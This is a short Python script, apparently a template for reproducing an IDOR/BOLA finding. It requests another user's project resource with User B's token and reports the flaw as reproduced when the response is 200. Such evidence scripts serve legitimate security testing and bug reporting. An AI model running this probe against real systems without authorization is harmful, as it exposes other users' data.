#!/usr/bin/env python3
"""
reproduce_template.py - Standalone Evidence Reproduction Script
Verifies that User B can improperly access User A's resource (IDOR/BOLA evidence).
"""
import os
import requests

BASE_URL = os.getenv("TARGET_BASE_URL", "http://localhost:8000")
USER_B_TOKEN = os.getenv("USER_B_TOKEN", "mock_token_for_user_b")
TARGET_RESOURCE_ID = os.getenv("TARGET_RESOURCE_ID", "123")

def test_reproduction():
    headers = {
        "Authorization": f"Bearer {USER_B_TOKEN}",
        "Content-Type": "application/json"
    }
    
    url = f"{BASE_URL}/api/projects/{TARGET_RESOURCE_ID}"
    print(f"[*] Sending request as User B to: {url}")
    response = requests.get(url, headers=headers)
    
    print(f"[*] Response Status Code: {response.status_code}")
    print(f"[*] Response Body: {response.text[:200]}")
    
    # Reproduction succeeds if vulnerability manifests (status code is 200 rather than 403/404)
    if response.status_code == 200:
        print("[!] VULNERABILITY REPRODUCED: User B successfully accessed User A's object.")
        return 0
    else:
        print(f"[-] Reproduction failed. Received expected defense: {response.status_code}")
        return 1

if __name__ == "__main__":
    exit(test_reproduction())

